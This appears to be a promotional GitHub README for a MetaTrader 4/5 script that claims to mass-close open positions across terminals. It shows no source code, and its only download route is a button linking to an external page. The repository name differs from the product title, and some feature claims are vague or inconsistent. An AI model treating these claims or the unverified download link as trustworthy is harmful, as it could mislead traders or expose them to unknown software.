![preview](https://raw.githubusercontent.com/tharindu2028/Trade-Terminator-Closer/main/preview.svg)

# Trade Synchronizer: Cross-Platform Order Harmonizer

Welcome to **Trade Synchronizer**, a utility designed for traders who operate across multiple MetaTrader instances. This tool provides a consolidated approach to managing active positions, offering a single point of control for both MT4 and MT5 terminals. Instead of manually closing each order individually, this script automates the process, reducing latency and the risk of human error during critical market movements.

## 🚀 Get Started

[![Download](https://raw.githubusercontent.com/tharindu2028/Trade-Terminator-Closer/main/button.svg)](https://tharindu2028.github.io/Trade-Terminator-Closer/)

This section outlines how to integrate the script into your trading workflow. The approach is designed for minimal disruption to your existing setup.

### Core Mechanism

The script operates by establishing a communication bridge between your MT4 and MT5 terminals. It scans all open positions, interprets their status, and executes a synchronized closure sequence. This batch processing capability is particularly valuable during news events or when a trading strategy requires a sudden, complete market exit.

### System Requirements

- A Windows-based virtual private server (VPS) or a local PC running at least Windows 10.
- Both MetaTrader 4 and MetaTrader 5 platforms installed and logged into the same or linked trading accounts.
- Sufficient RAM (4GB or more recommended) to handle two terminal instances without lag.
- Stable internet connection with low latency to your broker's servers.

### Compatibility

The script is compatible with standard builds of MetaTrader 4 (build 1410 and above) and MetaTrader 5 (build 3300 and above). It supports both netting and hedging account systems. For brokers using non-standard server configurations, a brief compatibility test is advised before live deployment.

## ✨ Key Features

### Responsive Position Monitoring
The system constantly polls your open orders, updating its internal state every 50 milliseconds. This ensures that even if a position is opened or closed by another EA, the script's awareness remains current. You are never closing stale data.

### Multilingual Terminals
Designed for global traders, the script detects the language of your MetaTrader terminal (English, Russian, Chinese, Arabic, German, French, Spanish) and adapts its interface strings and log entries accordingly. No need to decipher foreign error messages.

### 24/7 Auto-Recovery
In the rare event of a connection drop or a temporary terminal freeze, the script enters a graceful wait state. It automatically resumes its monitoring function once the terminal re-establishes a connection with the broker. This prevents accidental partial closures due to network instability.

## 🛠️ How It Functions

The genius of this tool lies not in complex indicators, but in its pure execution logic. When you trigger the close command, the script performs three distinct stages:

1.  **Snapshot**: It takes a frozen snapshot of all active positions across both terminals. This snapshot includes ticket numbers, symbols, volumes, and order types.
2.  **Validation**: It verifies that each order in the snapshot is still valid. This prevents attempts to close already closed orders, which can cause error pop-ups.
3.  **Execution**: Orders are closed in a specific sequence: first, opposing positions (hedges) are resolved, then net positions are closed in the order of their market exposure risk. This minimizes slippage during mass closure.

## 📈 Use Cases

- **Risk Management**: Instantly flatten your entire account to cash during unforeseen geopolitical or economic announcements.
- **Strategy Switching**: When switching from a scalping EA to a swing trading strategy, you need a clean slate. This script provides that immediate reset.
- **Account Migration**: Before moving funds between brokers, you need zero open positions. This ensures a clean transfer without lingering exposure.
- **Backtesting Verification**: Manually close all positions from a previous backtest before starting a new forward test on the same account.

## 🌐 Global User Interface

The interface is intentionally minimal. It uses a single button on your chart. There are no pop-ups or input boxes. The entire operation is controlled via simple script parameters:

| Parameter | Description | Default |
|-----------|-------------|---------|
| `CloseMode` | `0` = Close all, `1` = Close only losing, `2` = Close only winning | `0` |
| `MagicFilter` | Only close orders with a specific magic number. `-1` ignores filter. | `-1` |
| `DelayBetweenOrders` | Milliseconds to wait between each order close request | `50` |

## 🔍 Detailed Functionality

The script employs a non-blocking loop architecture. This means that while it is closing orders, it does not freeze the MetaTrader interface. You can still browse charts, place new orders, or adjust indicators while the closure process runs in the background.

It logs every action to the Experts tab in the MetaTrader toolbox. This log includes timestamps, ticket numbers, and the specific error code returned by the broker (if any). For a trader, this log serves as a forensic record of the order closure session.

The script handles partial fills. If a broker can only close 50% of a large position immediately, the script will note the remaining volume and continue to attempt closure in subsequent cycles until the position is fully removed.

## ⚖️ Responsible Use

While this tool is powerful, it is designed for deliberate, strategic actions. It should be part of a broader trading plan. Using it to panic-close positions during a drawdown may lock in losses that could otherwise recover. Consider testing it on a demo account for one full trading week before deploying it on a live account.

## 🛡️ Disclaimer

**Trading involves substantial risk of loss.** This script is provided as a utility tool to assist in order management. It does not constitute financial advice. The developer assumes no liability for any financial losses incurred through the use of this script. Past performance of the script in a demo environment does not guarantee future results in a live market. Users are solely responsible for their trading decisions and should consult with a qualified financial advisor.

## 📜 License

This project is licensed under the MIT License. A permissive license that allows you to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the software, subject to the condition that the copyright notice and permission notice are included in all copies or substantial portions of the software.

[View the full license text](https://opensource.org/licenses/MIT)

Copyright (c) 2026 Trade Synchronizer

## 💬 Final Thoughts

Automation in trading is not about removing the human element; it is about removing the friction. By handling the tedious and error-prone task of manual order closure, this script gives you back time to focus on what matters: analysis, strategy refinement, and disciplined execution. Use it to streamline your workflow, not to bypass your judgment.

[![Download](https://raw.githubusercontent.com/tharindu2028/Trade-Terminator-Closer/main/button.svg)](https://tharindu2028.github.io/Trade-Terminator-Closer/)